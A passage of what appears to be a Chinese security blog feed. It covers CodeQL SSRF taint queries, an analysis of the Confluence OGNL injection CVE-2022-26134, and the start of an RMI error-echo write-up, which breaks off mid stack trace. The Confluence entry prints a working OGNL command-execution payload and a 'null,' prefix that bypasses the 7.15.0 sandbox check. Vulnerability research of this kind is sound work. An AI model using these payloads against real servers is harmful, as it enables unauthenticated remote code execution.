只分析经过用户代码的路径。对第三方方法的调用被视为黑箱，除非你添加一些额外的建模步骤</u>。这就是<code>isAdditional&#123;Flow|Taint&#125;Step</code>的作用。你可以通过实现这些谓词并描述数据的进出方式来建模库代码中的路径</p></blockquote><p>所以说当流经过第三方库的方法时，追踪断掉了，需要通过<code>isAdditionalFlowStep</code>将其连接起来</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">predicate is<span class="hljs-constructor">AdditionalFlowStep(DataFlow::Node <span class="hljs-params">n1</span>, DataFlow::Node <span class="hljs-params">n2</span>)</span> &#123;<br>  exists(MethodCall ma <span class="hljs-pattern-match">|</span><br><span class="hljs-pattern-match">      ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">Name()</span> = &quot;decode&quot; <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">      ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">QualifiedName(<span class="hljs-string">&quot;org.apache.commons.codec.net&quot;</span>, <span class="hljs-string">&quot;URLCodec&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">      ma.get<span class="hljs-constructor">Argument(0)</span> = n1.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">      ma = n2.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span></span><br><span class="hljs-pattern-match">    )</span><br><span class="hljs-pattern-match">&#125;</span><br></code></pre></td></tr></table></figure><p>而在方法 4 中添加了过滤方法，通过该方法不存在 SSRF 漏洞，所以要将方法 4 排除在外，这就是<code>isBarrier</code>谓词的作用，告诉 CodeQL 当流经过哪个方法时，这条路径是安全的</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">predicate is<span class="hljs-constructor">Barrier(DataFlow::Node <span class="hljs-params">node</span>)</span> &#123;<br>  exists(MethodCall ma <span class="hljs-pattern-match">|ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">Name()</span>=&quot;filter<span class="hljs-constructor">URL</span>&quot;  <span class="hljs-keyword">and</span> ma.get<span class="hljs-constructor">Argument(0)</span>=node.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span> )</span><br><span class="hljs-pattern-match">&#125;</span><br></code></pre></td></tr></table></figure><p>所以最终写法如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import java<br>import semmle.code.java.dataflow.TaintTracking<br>import semmle.code.java.dataflow.FlowSources<br><br><span class="hljs-keyword">module</span> MyFlowConfiguration implements DataFlow::ConfigSig &#123;<br><br>  predicate is<span class="hljs-constructor">Source(DataFlow::Node <span class="hljs-params">source</span>)</span> &#123;<br>    source instanceof RemoteFlowSource<br>  &#125;<br><br>  predicate is<span class="hljs-constructor">Sink(DataFlow::Node <span class="hljs-params">sink</span>)</span> &#123;<br>   exists(MethodCall ma <span class="hljs-pattern-match">| ma.get<span class="hljs-constructor">Method()</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;URLConnection&quot;</span>)</span> <span class="hljs-keyword">and</span> </span><br><span class="hljs-pattern-match">   ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">Name(<span class="hljs-string">&quot;HttpUtils&quot;</span>)</span> <span class="hljs-keyword">and</span> </span><br><span class="hljs-pattern-match">   sink.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span>=ma.get<span class="hljs-constructor">AnArgument()</span> )</span><br><span class="hljs-pattern-match">  &#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">  predicate is<span class="hljs-constructor">AdditionalFlowStep(DataFlow::Node <span class="hljs-params">n1</span>, DataFlow::Node <span class="hljs-params">n2</span>)</span> &#123;</span><br><span class="hljs-pattern-match">    exists(<span class="hljs-constructor">MethodCall</span> ma |</span><br><span class="hljs-pattern-match">        ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">Name()</span> = &quot;decode&quot; <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">        ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">DeclaringType()</span>.has<span class="hljs-constructor">QualifiedName(<span class="hljs-string">&quot;org.apache.commons.codec.net&quot;</span>, <span class="hljs-string">&quot;URLCodec&quot;</span>)</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">        ma.get<span class="hljs-constructor">Argument(0)</span> = n1.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span> <span class="hljs-keyword">and</span></span><br><span class="hljs-pattern-match">        ma = n2.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span></span><br><span class="hljs-pattern-match">      )</span><br><span class="hljs-pattern-match">  &#125;</span><br><span class="hljs-pattern-match">  </span><br><span class="hljs-pattern-match">  predicate is<span class="hljs-constructor">Barrier(DataFlow::Node <span class="hljs-params">node</span>)</span> &#123;</span><br><span class="hljs-pattern-match">    exists(<span class="hljs-constructor">MethodCall</span> ma |ma.get<span class="hljs-constructor">Method()</span>.get<span class="hljs-constructor">Name()</span>=&quot;filter<span class="hljs-constructor">URL</span>&quot;  <span class="hljs-keyword">and</span> ma.get<span class="hljs-constructor">Argument(0)</span>=node.<span class="hljs-keyword">as</span><span class="hljs-constructor">Expr()</span> )</span><br><span class="hljs-pattern-match">  &#125;</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match"><span class="hljs-keyword">module</span> <span class="hljs-constructor">MyFlow</span> = <span class="hljs-constructor">TaintTracking</span>::<span class="hljs-constructor">Global</span>&lt;<span class="hljs-constructor">MyFlowConfiguration</span>&gt;;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">from <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">Node</span> source, <span class="hljs-constructor">DataFlow</span>::<span class="hljs-constructor">Node</span> sink</span><br><span class="hljs-pattern-match">where <span class="hljs-constructor">MyFlow</span>::flow(source, sink)</span><br><span class="hljs-pattern-match">select source, source.get<span class="hljs-constructor">EnclosingCallable()</span>, sink, sink.get<span class="hljs-constructor">EnclosingCallable()</span></span><br></code></pre></td></tr></table></figure><p>通过以上写法得到的正确的查询结果</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1725789144270-41797604-96fe-488c-a58b-b3006c85ce8c.png" alt="image.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://codeql.github.com/docs/writing-codeql-queries/about-data-flow-analysis/">About data flow analysis</a></li><li><a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/">Analyzing data flow in Java and Kotlin</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CodeQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-26134 分析学习</title>
    <link href="/2024/06/03/CVE-2022-26134-%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/06/03/CVE-2022-26134-%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>描述：在受影响的Confluence Server和Data Center版本中存在一个OGNL注入漏洞，允许未经身份验证的攻击者在Confluence Server或Data Center实例上执行任意代码。</p><p>影响版本：</p><ul><li>1.3.0 ≤ Atlassian Confluence Server&#x2F;Data Center &lt; 7.4.17</li><li>7.13.0 ≤ Atlassian Confluence Server&#x2F;Data Center &lt; 7.13.7</li><li>7.14.0 ≤ Atlassian Confluence Server&#x2F;Data Center &lt; 7.14.3</li><li>7.15.0 ≤ Atlassian Confluence Server&#x2F;Data Center &lt; 7.15.2</li><li>7.16.0 ≤ Atlassian Confluence Server&#x2F;Data Center &lt; 7.16.4</li><li>7.17.0 ≤ Atlassian Confluence Server&#x2F;Data Center &lt; 7.17.4</li><li>7.18.0 ≤ Atlassian Confluence Server&#x2F;Data Center &lt; 7.18.1</li></ul><p>参考链接：<a href="https://jira.atlassian.com/browse/CONFSERVER-79016">https://jira.atlassian.com/browse/CONFSERVER-79016</a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>漏洞环境：<a href="https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2022-26134/README.zh-cn.md">confluence 7.13.6</a></p><p>根据官方<a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">公告</a>，如果不升级的话，可以通过替换 jar 包进行临时修复，Confluence 6.0.0 - Confluence 7.14.2 之间的漏洞版本修复方式如下：</p><blockquote><p>1）关闭 Confluence</p><p>2）下载新的jar包到Confluence 服务器：</p><ul><li>xwork-1.0.3-atlassian-10.jar</li><li>webwork-2.1.5-atlassian-4.jar</li><li>CachedConfigurationProvider.class</li></ul><p>3）从Confluence 安装目录中移除旧的jar包，如：</p><p><confluence-install>&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F;xwork-1.0.3.6.jar</p><p><confluence-install>&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F;webwork-2.1.5-atlassian-3.jar</p><p>4)将先前下载的xwork-1.0.3-atlassian-10.jar、webwork-2.1.5-atlassian-4.jar包，复制到Confluence 安装目录：<confluence-install>&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F; （这里要注意新的jar包权限要和同目录中其他文件相同）</p><p>5）创建一个名为webwork的新目录</p><p>将CachedConfigurationProvider.class复制到<confluence-install>&#x2F;confluence&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;atlassian&#x2F;confluence&#x2F;setup&#x2F;webwork（确保权限和所有权和同目录文件相同）</p><p>启动 Confluence</p></blockquote><p>因为官方提供的下载地址需要登录，所以我从 7.13.7 这个安全版本中将上面两个 jar 考出来，与漏洞环境中的的 jar 包进行比较</p><p>发现对<code>com.opensymphony.xwork.ActionChainResult#execute</code>方法进行了修改，不再调用<code>com.opensymphony.xwork.util.TextParseUtil#translateVariables</code>方法</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717835718992-7864264b-b1e6-4458-8340-23c98b8527a1.png" alt="image.png"></p><p>跟进<code>TextParseUtil#translateVariables</code>方法可以发现，这里先匹配<code>$&#123;&#125;</code>里面的字符串，然后调用了<code>findValue()</code>方法</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716958945587-bb144993-3146-41b7-9e1d-795ee64ca9d7.png" alt="image.png"></p><p>正好<code>OgnlValueStack#findValue()</code>方法也添加了安全检测</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717332309188-c6c1466e-4492-4565-b5cf-6ee5f79f059f.png" alt="image.png"></p><p>在<code>ActionChainResult#execute</code>方法和<code>OgnlValueStack#findValue()</code>方法中下断点</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><strong>如何触发到 ActionChainResult#execute 方法呢 ？</strong></p><p>在 struts2 中当请求逻辑走完后，会调用 <code>DefaultActionInvocation</code> 的 <code>executeResult()</code> 方法，在该方法中调用 <code>Result</code> 实现类里的 <code>execute()</code> 方法开始处理这次请求的结果，而<code>ActionChainResult</code>类就是实现<code>Result</code>接口的众多类之一</p><p><strong>那么如何确定要调用哪个 Result 接口的实现类呢？</strong></p><p>在<code>DefaultActionInvocation#executeResult</code>方法中，会调用<code>DefaultActionInvocation#createResult</code>方法来获得这个<code>Result</code>实现类的实例，然后再执行其<code>execute</code>方法</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716968103331-688c72bc-e356-491a-9bfa-ad552766d126.png" alt="image.png"></p><p>根据<code>this.resultCode</code>的值确定<code>Result</code>实例</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716968448533-6706c4e9-55f0-48d0-971b-b97f6f499795.png" alt="image.png"></p><p>从这里就可以看到当<code>this.resultCode</code>为<code>notpermitted</code>时，获取到的就是<code>ActionChainResult</code>实例</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716968871803-eca668d7-261a-4bb6-a840-531fe3231f23.png" alt="image.png"></p><p><strong>这个 this.resultCode 从哪里定义呢？</strong></p><p>在<code>DefaultActionInvocation#invoke</code>方法中，会先递归调用拦截器栈中的拦截器，如果调用过程中被哪个拦截器所拦截，也会返回值给<code>this.resultCode</code>，如果顺利通过所有拦截器，那么就会进入 <code>else if</code>或 <code>else</code>中，通过反射调用请求 action 中的方法，这个<code>this.resultCode</code>就是执行 action 方法后返回的值</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716970900298-d24e020c-5e2c-4f02-9231-23d15876bb94.png" alt="image.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kay.struts2.Action.LoginAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;timer&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span>/talk.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><ul><li><p><code>&lt;result&gt;</code>标签用于定义 action 的结果</p><ul><li><p><code>name</code>属性的值用于匹配 action 中所执行方法的返回值，在上面的配置中 name 的属性值为 success，如果<code>execute</code>方法返回字符串 success ，那么服务器就返回<code>talk.jsp</code>页面</p></li><li><p><code>type</code>属性决定了如何处理 Action 的结果，不写默认为<code>dispatcher</code></p><ul><li><p><code>dispatcher</code>：默认值。将结果发送到服务器端的资源（通常是 JSP 页面），由服务器端进行处理和呈现。</p></li><li><p><code>redirect</code>：将结果重定向到指定的 URL 或 Action。</p></li><li><p><code>chain</code>：将结果传递给下一个 Action。</p></li><li><p><code>redirectAction</code>：重定向到另一个 Action，并将结果传递给该 Action。</p></li><li><p><code>json</code>：将结果作为 JSON 数据返回。</p></li><li><p><code>stream</code>：将结果作为流数据返回。</p></li></ul></li></ul></li></ul></blockquote><p>confluence 中相关的配置在<code>confluence-x.x.x.jar</code>的<code>xwork.xml</code>文件中，可以看到当<code>&lt;result&gt;</code>标签中<code>type</code>属性值为<code>chain</code>时，便会调用<code>ActionChainResult</code>来处理结果</p><p><code>result-type</code>标签的作用就是用来自定义结果类型</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716974051064-33ee1231-6f46-4856-83f2-884fe714cb6b.png" alt="image.png"></p><p><code>global-results</code>标签用来配置全局结果，当某个 action 或者拦截器返回对应结果时，便会触发相应的处理逻辑</p><p><code>param</code>标签指定下一个会被调用到的 action</p><p>以<code>notpermitted</code>举例，当返回结果为<code>notpermitted</code>时，将以<code>chain</code>类型也就是调用<code>ActionChainResult</code>来处理，下一个被调用到的 action 是<code>notpermitted.action</code>  (result 可以通过配置跳转到各个页面，所以也可以跳转到其他 action)</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716979490581-b3ae942c-474d-4682-b80b-8cf2b256155e.png" alt="image.png"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>下一步就是找到所有返回结果对应<code>type=&quot;chain&quot;</code>的，看如何触发能使其返回对应结果，同时又是可控的</p><p>刚开始调试的时候，便偶然触发到一个，直接未登录状态访问 confluence 网站根路径便会触发到<code>ActionChainResult#execute</code>方法，而这里的<code>this.actionName</code>是<code>notpermitted</code>，也就是下一个被调用的 action 是<code>notpermitted</code>，那么说明访问的 action 或者拦截器返回的结果是<code>notpermitted</code></p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716981671128-6a51abf0-1232-4aaf-8cfb-640d8a09ab3d.png" alt="image.png"></p><p>根据 web.xml 中配置的<code>welcome-file-list</code>可知当访问网站根路径时默认会访问<code>index.action</code>，其对应的类为<code>com.atlassian.confluence.core.actions.IndexAction</code></p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716982028974-b0284f2c-5aba-4130-8ba4-c80c146006b9.png" alt="image.png"  /><p>而<code>IndexAction#execute</code>方法根本不会返回<code>notpermitted</code>，说明没有调用到 action 这一步，而是在拦截器中返回的<code>notpermitted</code></p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716982197550-2fcf94b3-ab67-4849-95b1-b48c2a61f345.png" alt="image.png"></p><p>index.action 对应的是<code>defaultStack</code>默认拦截器栈，在所有能返回<code>notpermitted</code>结果的拦截器中下断点，发现是从<code>ConfluenceAccessInterceptor#intercept</code>这个拦截器中返回的</p><p>这个拦截器的作用是根据要调用的方法上存在的访问检查注释，判断当前用户是否有对该方法的访问权限，如果方法中没有注释会检查类上的注释，类上没有会检查包上的</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1716986754249-c77e3aa3-cd58-403b-877e-b6cc5fab00a2.png" alt="image.png"></p><p>而<code>IndexAction</code>类上存在<code>@RequiresAnyConfluenceAccess</code>注释，该注释的意思是允许具有 Confluence 访问权限的任何用户执行目标操作，而未登录的情况下，很明显没有访问权限，所以被<code>ConfluenceAccessInterceptor</code>拦截器拦截并返回<code>notpermitted</code>，因此调用<code>ActionChainResult</code>处理返回结果</p><p>很明显<code>this.actionName</code>是不可控的，它表示下一个要调用的 action，这个是根据<code>xwork.xml</code>中的<code>param</code>标签的配置得来的</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717027630971-893f706f-daed-46a8-b4fc-f645dea9a923.png" alt="image.png"></p><p>所以只能控制<code>this.namespace</code>，这是因为在<code>xwork.xml</code>中，只指定了下一个要调用的 action，并未在<code>param</code>标签中指定<code>namespace</code></p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717028572329-1e5f4abd-6280-48d0-a67f-fa2f05ca886a.png" alt="image.png"></p><p>在<code>ActionChainResult#execute</code>方法中，如果<code>namespace</code>为<code>null</code>，则会获取请求中的<code>namespace</code></p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717028813380-45e55da1-719b-4ada-a7b2-ccab421f52a9.png" alt="image.png"></p><p>当传入请求时，会在<code>RuntimeConfigurationImpl#getActionConfig</code>方法中进行处理，先根据传入的路径获取该路径下的所有 ActionConfig，然后根据传入的<code>action</code>名称获取对应的<code>ActionConfig</code>，当根据传入的路径获取不到<code>actions</code>时，则会获取根路径下的<code>actions</code>，尝试从中获取对应的<code>ActionConfig</code>，所以路径是什么无所谓，只要传入的<code>action</code>名称在根路径中存在即可，这样程序便能继续往下运行，否则会因为获取不到<code>config</code>而抛出异常</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717029112116-3b82cea4-68c4-41f5-af47-fc372167aae9.png" alt="image.png"></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>如果是低版本直接使用如下 poc 便可以，因为 poc 是放在请求路径中的，如果 poc 中包含<code>/</code>则会报 400 错误，所以这里通过请求头传递命令，发送请求时记得对 poc 进行 url 编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$&#123;#cmd=@com.opensymphony.webwork.ServletActionContext@getRequest().getHeader(&quot;cmd&quot;),#p=@java.lang.Runtime@getRuntime().exec(#cmd),#str=@org.apache.commons.io.IOUtils@toString(#p.getInputStream()),@com.opensymphony.webwork.ServletActionContext@getResponse().addHeader(&quot;result&quot;,#str)&#125;<br></code></pre></td></tr></table></figure><p>但是在 7.15.0 版本中，该 poc 则无效了，因为该版本在<code>OgnlValueStack#findValue()</code>方法中添加了安全检测，检测方式与<code>CVE-2021-26084</code>中相同，不过这里的检测变得更为严格，<code>CVE-2021-26084</code>中的 poc 无法直接用</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717344972478-55f6f864-7da1-41d5-9dd7-d5682ab93507.png" alt="image.png"></p><p>检查最终还是在<code>SafeExpressionUtil#containsUnsafeExpression()</code>方法中进行的，通过对网上 payload 的学习,发现一个最简单的绕过方式，那就是在我们原先的 poc 前面添加一个<code>null</code>，便可以绕过检测（其它绕过方式<a href="https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/">链接</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">$&#123;null,#cmd=@com.opensymphony.webwork.ServletActionContext@getRequest().getHeader(&quot;cmd&quot;),#p=@java.lang.Runtime@getRuntime().exec(#cmd),#str=@org.apache.commons.io.IOUtils@toString(#p.getInputStream()),@com.opensymphony.webwork.ServletActionContext@getResponse().addHeader(&quot;result&quot;,#str)&#125;<br></code></pre></td></tr></table></figure><p>在<code>SafeExpressionUtil#containsUnsafeExpression()</code>方法中依然会对每个节点极其子节点进行递归检查，那么这里第一个检查的子节点便是<code>null</code>，<code>null</code>属于<code>ASTConst</code>类型</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717345657430-2f1181c0-3b9c-4929-a83e-6e151932b223.png" alt="image.png"></p><p>所以会进入到<code>SafeExpressionUtil#isSafeConstantExpressionNode</code>方法中，节点<code>null</code>执行<code>getValue</code>方法获得的依然是<code>null</code>，但是后面执行<code>toString</code>方法会抛出<code>java.lang.NullPointerException</code>异常，而下面的<code>catch</code>无法捕捉该异常</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717345717436-b3ca8221-2f03-4a3b-8a39-d343e172d04e.png" alt="image.png"></p><p>异常会在<code>SafeExpressionUtil#isSafeExpressionInternal</code>方法中被捕捉到，因此也就跳出了<code>SafeExpressionUtil#containsUnsafeExpression()</code>方法的检测</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1717345961324-d137f628-0dc8-4813-973f-0feb18522b66.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Plain">isSafeConstantExpressionNode:199, SafeExpressionUtil (com.opensymphony.xwork.util)<br>containsUnsafeExpression:184, SafeExpressionUtil (com.opensymphony.xwork.util)<br>containsUnsafeExpression:189, SafeExpressionUtil (com.opensymphony.xwork.util)<br>isSafeExpressionInternal:155, SafeExpressionUtil (com.opensymphony.xwork.util)<br>isSafeExpression:137, SafeExpressionUtil (com.opensymphony.xwork.util)<br>findValue:134, OgnlValueStack (com.opensymphony.xwork.util)<br>translateVariables:39, TextParseUtil (com.opensymphony.xwork.util)<br>execute:95, ActionChainResult (com.opensymphony.xwork)<br>executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI 回显构造</title>
    <link href="/2023/09/04/RMI-%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/"/>
    <url>/2023/09/04/RMI-%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="bind-攻击回显"><a href="#bind-攻击回显" class="headerlink" title="bind 攻击回显"></a>bind 攻击回显</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>RMI 客户端向服务端发起请求查询某个绑定的对象并调用其方法时，方法是在服务端执行然后将结果返回给客户端的，如果服务端执行的过程中出错，那么报错信息也会返回给客户端，所以利用返回报错信息的特点，将命令执行的结果通过报错信息返回，达到回显的目的</p><p>先看一个正常的，将一个对象绑定到 server 端，对其进行查询调用，这里对服务端进行 debug</p><p>发送给服务端的序列化数据，会在<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>方法中进行反序列化，不过 8u141 之前无法在该方法中下断点，可在<code>sun.rmi.registry.RegistryImpl#lookup</code>方法中下断点，因为在<code>RegistryImpl_Skel#dispatch</code>反序列化后，会调用<code>RegistryImpl</code>类中的相关方法（bind、rebind 也是同理）</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667863853-d31debe8-71e5-4f25-b6c2-8e558f5521da.png" alt="image.png"></p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667902499-8689e467-3a2f-4ec6-8d1c-b8436440d3ee.png" alt="image.png"></p><p>成功查询到对象，然后返回给客户端</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668022104-3c5fd138-b442-4a00-b08e-dfa380ddc38a.png" alt="image.png"></p><p>客户端再远程调用该对象的方法，在<code>sun.rmi.server.UnicastServerRef#dispatch</code>方法中通过反射调用</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668424004-5d93ae24-a1d4-497d-a58c-156e6eeb9f68.png" alt="image.png"></p><p>在<code>sun.rmi.server.UnicastRef#marshalValue</code>方法中将结果写入</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668464333-d0d16cc3-7a5b-4df4-abce-5cfb0ca4761f.png" alt="image.png"></p><p>在<code>sun.rmi.server.UnicastServerRef#dispatch</code>方法的最后将结果返回给客户端</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668539097-546d5b02-6e49-4058-b53a-b24cd7395da7.png" alt="image.png"></p><p>那么如果服务端在反序列化客户端发来的数据时，报错了会怎样，那么报错的信息依然会发送给客户端，在客户端查找一个注册表中不存在的名称</p><p>在<code>sun.rmi.registry.RegistryImpl#lookup</code>方法中会抛出异常</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693673499084-8ca36d23-b0bb-4375-891b-110ffd05df5c.png" alt="image.png"></p><p>这个异常会在<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>方法中被捕获，然后返回给客户端</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693673734215-4f0ddbea-756b-4863-b498-eb627a266e46.png" alt="image.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">lookup:</span><span class="hljs-number">166</span>, RegistryImpl (sun.rmi.registry)<br><span class="hljs-symbol">dispatch:</span><span class="hljs-number">-1</span>, RegistryImpl_Skel (sun.rmi.registry)<br><span class="hljs-symbol">oldDispatch:</span><span class="hljs-number">410</span>, UnicastServerRef (sun.rmi.server)<br><span class="hljs-symbol">dispatch:</span><span class="hljs-number">268</span>, UnicastServerRef (sun.rmi.server)<br><span class="hljs-symbol">run:</span><span class="hljs-number">178</span>, Transport<span class="hljs-number">$1</span> (sun.rmi.transport)<br><span class="hljs-symbol">run:</span><span class="hljs-number">175</span>, Transport<span class="hljs-number">$1</span> (sun.rmi.transport)<br><span class="hljs-symbol">doPrivileged:</span><span class="hljs-number">-1</span>, AccessController (java.security)<br><span class="hljs-symbol">serviceCall:</span><span class="hljs-number">174</span>, Transport (sun.rmi.transport)<br><span class="hljs-symbol">handleMessages:</span><span class="hljs-number">557</span>, TCPTransport (sun.rmi.transport.tcp)<br><span class="hljs-symbol">run0:</span><span 